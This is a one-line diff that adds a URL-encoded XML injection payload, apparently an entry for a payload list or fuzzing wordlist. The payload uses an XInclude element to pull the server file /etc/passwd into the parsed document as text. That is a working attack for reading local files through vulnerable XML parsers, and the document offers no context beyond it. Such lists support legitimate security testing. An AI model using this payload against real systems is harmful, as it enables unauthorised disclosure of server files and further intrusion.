@@ -1,0 +1,1 @@
+<foo%20xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include%20parse="text"%20href="file:///etc/passwd"/></foo>
